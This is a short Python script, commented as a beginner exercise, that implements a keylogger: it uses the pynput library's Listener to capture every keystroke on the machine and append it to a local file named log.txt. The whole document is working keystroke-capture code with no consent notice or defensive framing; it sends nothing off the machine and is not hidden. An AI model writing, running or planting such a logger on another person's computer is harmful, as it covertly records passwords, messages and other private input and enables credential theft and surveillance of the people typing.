#--------------------------------------------#
#                 -keylogger-                #
#                                            #
#     Goal of the keylogger is to store      # 
#     keystrokes of the user                 #
#     in a text file                         #
#                                            #
#--------------------------------------------#

#import pynput to monitor keystrokes
from pynput.keyboard import Listener

#Defining write to a file by the press of a key
def writetofile(key):

    #assigns keydata with the string key
    keydata = str(key)
    #open the log txt file and appends new data to file
    with open("log.txt", "a") as f:
        f.write(keydata)

#listen monitors key input and joins
with Listener(writetofile) as l:
    l.join()
    
    